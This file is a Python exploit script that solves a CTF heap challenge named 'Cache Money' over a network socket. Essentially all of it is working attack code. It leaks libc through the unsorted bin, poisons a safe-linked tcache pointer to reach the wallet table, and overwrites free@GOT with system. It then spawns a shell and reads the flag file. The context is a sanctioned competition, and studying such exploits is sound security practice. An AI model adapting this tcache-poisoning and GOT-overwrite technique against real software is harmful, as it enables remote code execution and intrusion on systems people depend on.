#!/usr/bin/env python3
"""Solve SunshineCTF 2026's Cache Money challenge."""

import argparse
import socket
import struct
import time

MENU = b">>> "
WALLET_TABLE = 0x4040C0
FREE_GOT = 0x404000
MAIN_ARENA_LEAK_OFFSET = 0x203B20
SYSTEM_OFFSET = 0x58740


class Connection:
    def __init__(self, sock):
        self.sock = sock
        self.buffer = bytearray()

    def send(self, data):
        self.sock.sendall(data)

    def receive_until(self, marker, timeout=8):
        self.sock.settimeout(timeout)
        while marker not in self.buffer:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise EOFError(f"connection closed before {marker!r}")
            self.buffer.extend(chunk)
        end = self.buffer.index(marker) + len(marker)
        result = bytes(self.buffer[:end])
        del self.buffer[:end]
        return result

    def receive_exact(self, size, timeout=8):
        self.sock.settimeout(timeout)
        while len(self.buffer) < size:
            chunk = self.sock.recv(size - len(self.buffer))
            if not chunk:
                raise EOFError(f"connection closed with {len(self.buffer)} of {size} bytes")
            self.buffer.extend(chunk)
        result = bytes(self.buffer[:size])
        del self.buffer[:size]
        return result

    def open_wallet(self, name, size):
        self.send(b"1\n" + name + b"\n" + str(size).encode() + b"\n")
        self.receive_until(MENU)

    def transfer(self, source, destination):
        self.send(f"4\n{source}\n{destination}\n".encode())
        self.receive_until(MENU)

    def close_wallet(self, index):
        self.send(f"5\n{index}\n".encode())
        self.receive_until(MENU)

    def deposit(self, index, data):
        self.send(f"2\n{index}\n".encode())
        time.sleep(0.05)
        self.send(data)
        self.receive_until(MENU)

    def withdraw(self, index, size):
        self.send(f"3\n{index}\n".encode())
        self.receive_until(b"    ")
        data = self.receive_exact(size)
        self.receive_until(MENU)
        return data


def qword(value):
    return struct.pack("<Q", value)


def solve(host, port):
    with socket.create_connection((host, port), timeout=8) as sock:
        link = Connection(sock)
        link.receive_until(MENU)

        # Fill the 0x110 tcache bin; the last freed ledger reaches the unsorted bin.
        for index in range(16):
            link.open_wallet(f"W{index}".encode(), 256)
        for index in range(0, 16, 2):
            link.transfer(index, index + 1)

        leak = struct.unpack("<Q", link.withdraw(15, 256)[:8])[0]
        libc_base = leak - MAIN_ARENA_LEAK_OFFSET
        system_address = libc_base + SYSTEM_OFFSET
        print(f"libc base: {libc_base:#x}")

        # Set up a freed 0x80 chunk and learn its safe-linked NULL value.
        link.close_wallet(12)
        link.close_wallet(14)
        link.open_wallet(b"small", 112)
        link.open_wallet(b"other", 256)
        link.transfer(12, 1)
        encoded_null = struct.unpack("<Q", link.withdraw(1, 112)[:8])[0]

        link.close_wallet(12)
        link.close_wallet(14)
        link.deposit(1, b"\0" * 112)
        link.transfer(1, 3)

        encoded_table = WALLET_TABLE ^ encoded_null
        link.deposit(3, qword(encoded_table) + b"P" * 104)

        # The two allocations return the original chunk, then the wallet table.
        link.open_wallet(b"first", 112)
        link.open_wallet(b"table", 112)

        records = bytearray(112)
        runner_address = WALLET_TABLE + 0x40

        # Slot 0 points to the fake runner, slot 1 to the fake editor.
        records[0:8] = qword(runner_address)
        records[8:16] = qword(WALLET_TABLE)

        # Fake editor record: ledger = free@GOT, ledger size = 8, active = 1.
        records[24:32] = qword(FREE_GOT)
        records[32:40] = qword(8)
        records[40:44] = struct.pack("<I", 1)

        # Fake runner record at table + 0x40: name = "sh", no ledger, active = 1.
        records[64:67] = b"sh\0"
        records[104:108] = struct.pack("<I", 1)

        link.deposit(14, bytes(records))
        link.deposit(1, qword(system_address))

        # Closing slot 0 invokes system("sh"); ask that shell for the flag.
        link.send(b"5\n0\n")
        link.receive_until(b'[*] Closing wallet "sh"...', timeout=4)
        link.send(b"cat /ctf/flag.txt; exit\n")
        output = link.receive_until(b"}", timeout=8)
        print(output.decode("utf-8", errors="replace"), end="")


def main():
    parser = argparse.ArgumentParser(description="Solve the Cache Money challenge.")
    parser.add_argument("--host", default="chal.sunshinectf.games")
    parser.add_argument("--port", type=int, default=26004)
    args = parser.parse_args()
    solve(args.host, args.port)


if __name__ == "__main__":
    main()
